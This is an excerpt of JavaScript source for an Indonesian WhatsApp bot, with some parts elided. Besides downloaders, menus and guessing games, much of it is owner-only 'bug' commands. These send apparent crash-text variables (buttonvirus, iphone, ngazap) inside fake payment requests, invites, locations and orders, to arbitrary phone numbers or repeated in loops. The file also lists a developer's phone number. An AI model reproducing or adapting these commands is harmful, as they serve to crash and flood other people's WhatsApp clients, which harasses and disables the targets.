let ghd = await fanz.sendMessage(from,{video:{url: res.url[0].url},caption: "Sukses"},{quoted:m})
}
break
case "tiktokaudio":{
if (!isCreator) return m.reply(mess.owner)
...
m.reply('Sabar Cuy Loading')
let res = await tiktok(q)
let ghd = await fanz.sendMessage(from,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'hw1': {
fanz.sendMessage(from, { image: hw1,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw2': {
fanz.sendMessage(from, { image: hw2,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw3': {
fanz.sendMessage(from, { image: hw3,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw4': {
fanz.sendMessage(from, { image: hw4,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw5': {
fanz.sendMessage(from, { image: hw5,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw6': {
fanz.sendMessage(from, { image: hw6,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw7': {
fanz.sendMessage(from, { image: hw7,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw8': {
fanz.sendMessage(from, { image: hw8,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw9': {
fanz.sendMessage(from, { image: hw9,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw10': {
fanz.sendMessage(from, { image: hw10,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw11': {
fanz.sendMessage(from, { image: hw11,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw12': {
fanz.sendMessage(from, { image: hw12,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw13': {
fanz.sendMessage(from, { image: hw13,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw14': {
fanz.sendMessage(from, { image: hw14,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw15': {
fanz.sendMessage(from, { image: hw15,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw16': {
fanz.sendMessage(from, { image: hw16,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw17': {
fanz.sendMessage(from, { image: hw17,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw18': {
fanz.sendMessage(from, { image: hw18,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw19': {
fanz.sendMessage(from, { image: hw19,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw20': {
fanz.sendMessage(from, { image: hw20,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw21': {
fanz.sendMessage(from, { image: hw21,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw22': {
fanz.sendMessage(from, { image: hw22,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw23': {
fanz.sendMessage(from, { image: hw23,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw24': {
fanz.sendMessage(from, { image: hw24,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw25': {
fanz.sendMessage(from, { image: hw25,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw26': {
fanz.sendMessage(from, { image: hw26,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw27': {
fanz.sendMessage(from, { image: hw27,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw28': {
fanz.sendMessage(from, { image: hw28,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw29': {
fanz.sendMessage(from, { image: hw29,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw30': {
fanz.sendMessage(from, { image: hw30,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw31': {
fanz.sendMessage(from, { image: hw31,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw32': {
fanz.sendMessage(from, { image: hw32,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw33': {
fanz.sendMessage(from, { image: hw33,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw34': {
fanz.sendMessage(from, { image: hw34,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw35': {
fanz.sendMessage(from, { image: hw35,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw36': {
fanz.sendMessage(from, { image: hw36,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw37': {
fanz.sendMessage(from, { image: hw37,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw38': {
fanz.sendMessage(from, { image: hw38,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw39': {
fanz.sendMessage(from, { image: hw39,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw40': {
fanz.sendMessage(from, { image: hw40,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw41': {
fanz.sendMessage(from, { image: hw41,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw42': {
fanz.sendMessage(from, { image: hw42,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw43': {
fanz.sendMessage(from, { image: hw43,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw44': {
fanz.sendMessage(from, { image: hw44,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw45': {
fanz.sendMessage(from, { image: hw45,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw46': {
fanz.sendMessage(from, { image: hw46,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw47': {
fanz.sendMessage(from, { image: hw47,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw48': {
fanz.sendMessage(from, { image: hw48,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw49': {
fanz.sendMessage(from, { image: hw49,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw50': {
fanz.sendMessage(from, { image: hw50,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw51': {
fanz.sendMessage(from, { image: hw51,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw52': {
fanz.sendMessage(from, { image: hw52,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw53': {
fanz.sendMessage(from, { image: hw53,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw54': {
fanz.sendMessage(from, { image: hw54,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw55': {
fanz.sendMessage(from, { image: hw55,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw56': {
fanz.sendMessage(from, { image: hw56,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw57': {
fanz.sendMessage(from, { image: hw57,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw58': {
fanz.sendMessage(from, { image: hw58,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw59': {
fanz.sendMessage(from, { image: hw59,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw60': {
fanz.sendMessage(from, { image: hw60,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw61': {
fanz.sendMessage(from, { image: hw61,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw62': {
fanz.sendMessage(from, { image: hw62,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw63': {
fanz.sendMessage(from, { image: hw63,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw64': {
fanz.sendMessage(from, { image: hw64,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw65': {
fanz.sendMessage(from, { image: hw65,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw66': {
fanz.sendMessage(from, { image: hw66,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw67': {
fanz.sendMessage(from, { image: hw67,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw68': {
fanz.sendMessage(from, { image: hw68,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw69': {
fanz.sendMessage(from, { image: hw69,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw70': {
fanz.sendMessage(from, { image: hw70,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw71': {
fanz.sendMessage(from, { image: hw71,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw72': {
fanz.sendMessage(from, { image: hw72,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw73': {
fanz.sendMessage(from, { image: hw73,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw74': {
fanz.sendMessage(from, { image: hw74,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw75': {
fanz.sendMessage(from, { image: hw75,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw76': {
fanz.sendMessage(from, { image: hw76,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw77': {
fanz.sendMessage(from, { image: hw77,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw78': {
fanz.sendMessage(from, { image: hw78,  caption: `© Created By FANZ` }, { quoted:m })
}
break
case 'hw79': {
fanz.sendMessage(from, { image: hw79,  caption: `© Created By FANZ` }, { quoted:m })
}
break
//=================================================//
case 'listaudio':
...
Semoga Kalian Suka 🥳`, fanz.user.name, `Hay Kak Audio Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listlogo':
touchmebree = [
{
...
Semoga Kalian Suka 🥳`, fanz.user.name, `Hay Kak Logo Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
...
title: `©️ FanzOfc`,
rows: [
{title: `🔏 PANEL FANZOfc`, rowId: `${prefix}panel`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}, 
...
fanz.sendListMsg(from, `
LIST JUALAN FANZOfc `, fanz.user.name, `Sitting equally, there is no king or lord, because we live only Gods creation from a clod of soil`, `Click Here 🌷`, touchmebree, m)
}
break
case 'apkFANZOfc': {
touchmebree = [
...
title: `©️ FanzOfc`,
rows: [
{title: `🔏 APK FANZOfc`, rowId: `${prefix}FANZOfccoy`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
fanz.sendListMsg(from, `
APLIKASI FANZOfc `, fanz.user.name, `MEMPERMUDAH KALIAN AKSES WEB FANZOfc AGAR TIDAL PERLU REPOT MEMBUKA GOOGLE`, `Click Here 🌷`, touchmebree, m)
}
break
case 'layanan':{
touchmebree = [
...
{title: `🔏 LARANGAN GROUP`, rowId: `${prefix}larangan`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 ...
 `},
 {title: `🔏 INFORMASI FANZOfc`, rowId: `${prefix}infoFANZOfc`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
...
fanz.sendListMsg(from, `
 SYARAT KETENTUAN LAYANAN FANZOfc YANG BERLAKU`, fanz.user.name, `Sitting equally, there is no king or lord, because we live only Gods creation from a clod of soil`, `Click Here 🌷`, touchmebree, m)
}
break
case 'payment':{
touchmebree = [
...
Semoga Kalian Suka 🥳`, fanz.user.name, `Hay Kak Pembayaran Ada Di List`, `Click Here 🌷`, touchmebree, m)
}
break
//=================================================//
case 'listwibu':
...
Semoga Kalian Suka 🥳`, fanz.user.name, `Hay Kak Wibu Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
case 'listban':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
Semoga Kalian Suka 🥳`, fanz.user.name, `Hay Kak List Ban Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
      case 'setadmin': {
      if (!isCreator) return m.reply(mess.owner)
...
{title: "FANZ ✅", rowId: `${prefix}setadmin hwmods`, description: `ONLINE`},
...
fanz.sendListMsg(from, `Settings Online Admin Panel FANZOfc`, fanz.user.name, `Hello Owner !`, `Click Here`, sections, m)
}
    }
    break
    case 'listadmin': {
 let setbot = global.db.data.settings[botNumber]
if (setbot.inod) {
fanz.sendMessage(from, { image: ppnyauser, caption: `*List Admin FANZOfc⚡* :

⚡Admin 1 - *Online✅*
Nama	: Fanz
Kontak : 6285812373011
...
📮Note :
*Hati Hati Penipuan Admin FanzOfc Panel Hanya 3 Orang Diatas!!!*` }, { quoted:m })
} else if (setbot.sura) {
fanz.sendMessage(from, { image: ppnyauser, caption: `*List Admin FANZOfc⚡* :
...
fanz.sendMessage(from, { image: ppnyauser, caption: `*SERVER PENUH*` }, { quoted:m })
} else if (setbot.offkabeh1) {
fanz.sendMessage(from, { image: ppnyauser, caption: `*MAINTENANCE*` }, { quoted:m })
} 
     }
    break
case 'inspect': {
...
©By Fanz`
try {
pp = await fanz.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
fanz.sendFile(from, pp, "", m, { caption: tekse, mentions: await fanz.parseMention(tekse) })
sticSukses(from)
})
}
break
...
let teks = `${q}`
{
a = await fanz.sendMessage(from, {react: {  key: { remoteJid: from, fromMe: true, id : m.key.id}}})
...
fanz.relayMessage(from, order.message, { messageId: order.key.id })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: fanz.waUploadToServer })
...
fanz.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone1}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone2}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone3}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone4}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone5}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone6}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
}
break
...
fanz.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
sticSukses(from)
}
}
break
...
let teks = `${q}`
{
fanz.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER FanzOfc`,"body": `Selamat ${salam} kak ${pushname}`,
...
let teks = `${q}`
{
joau = fs.readFileSync('./baseikal/video/fanz.mp4')
fanz.sendMessage(from, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
...
fanz.sendMessage(from, buttonnnnmMessage)
sticSukses(from)
}
 break
//=================================================//
...
touchmebre = [
{
title: `🌷 FanzOfc WA 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
...
fanz.sendListMsg(bnnd, `🌷 FanzOfc WA 🌷`, fanz.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
sticSukses(from)
break
//=================================================//
...
fanz.relayMessage(bnnd, order.message, { messageId: order.key.id })
sticSukses(from)
}
break
//=================================================//
...
fanz.relayMessage(bnnd, document.message, { messageId: document.key.id })
sticSukses(from)
}
break
//=================================================//
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${iphone}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${iphone1}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${iphone2}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${iphone3}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${iphone4}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${iphone5}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${iphone6}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
fanz.sendMessage(from, { image: ppnyauser,  caption: `FanzOfc${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
}
break
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${iphone}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${iphone1}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${iphone2}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${iphone3}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${iphone4}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${iphone5}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${iphone6}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${buttonkal}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285812373011`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
fanz.sendMessage(bnnd, { image: ppnyauser,  caption: `FanzOfc${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
break
//=================================================//
...
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6285812373011'}},
...
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© FanzOfc${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
fanz.relayMessage(bnnd, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
break
//=================================================//
...
fanz.relayMessage(bnnd, location.message, { messageId: location.key.id })
sticSukses(from)
}
break
//=================================================//
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© FanzOfc${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© FanzOfc${ngazap(prefix)}`,
...
fanz.sendMessage(from, buttonMessage)
sticSukses(from)
}
 break
//=================================================//
...
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER FanzOfc`,
}
}}), { userJid: from, quoted:m})
fanz.relayMessage(bnnd, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
sticSukses(from)
}
break
//=================================================//
...
ydd = `Hallo Aku fanz`
for (let i = 0; i < jumlah; i++) {
fanz.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER FanzOfc`,"body": `Selamat ${salam} kak ${pushname}`,
...
case 'buggastick':{
if (!isCreator) return m.reply(mess.owner)
fanz.sendImageAsSticker(from, fs.readFileSync('./baseikal/stickernye/SuksesCok.webp'), m, { packname: global.packname, author: global.author, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6285812373011',
title: `${buttonvirus}`,
...
case 'buggamvn':{
if (!isCreator) return m.reply(mess.owner)
fanz.sendMessage(from, {audio: fs.readFileSync('./baseikal/sound/ketawa.mp3'), mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6285812373011',
title: `FanzOfc`,
sourceUrl: `https://wa.me/6285812373011`, 
...
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME FanzOfc${ngazap(prefix)}`,
"groupName": `MY NAME FanzOfc${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
fanz.relayMessage(bnnd, groupInvite.message, { messageId: groupInvite.key.id })
...
break
    ...
    if (!isCreator) return m.reply(mess.owner)
                ...
                _family100['family100'+from] = {
                    id: 'family100'+from,
                    pesan: await fanz.sendText(from, hasil, m),
                    ...random,
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (args[0] === "lagu") {
                    ...
                    let msg = await fanz.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    fanz.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    fanz.sendButtonText(from, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, fanz.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    fanz.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    fanz.sendButtonText(from, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, fanz.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    fanz.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    fanz.sendButtonText(from, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, fanz.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                    ...
                    console.log("Jawaban: " + result.jawaban)
                    fanz.sendButtonText(from, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, fanz.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    fanz.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    fanz.sendButtonText(from, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, fanz.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    fanz.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
		    ...
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    ...
                    console.log("Jawaban: " + result.jawaban)
                    fanz.sendButtonText(from, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, fanz.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                fanz.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
...
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await fanz.sendText(from, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) fanz.sendText(from, `_Waktu suit habis_`, m)
            delete this.suit[id]
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                fanz.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
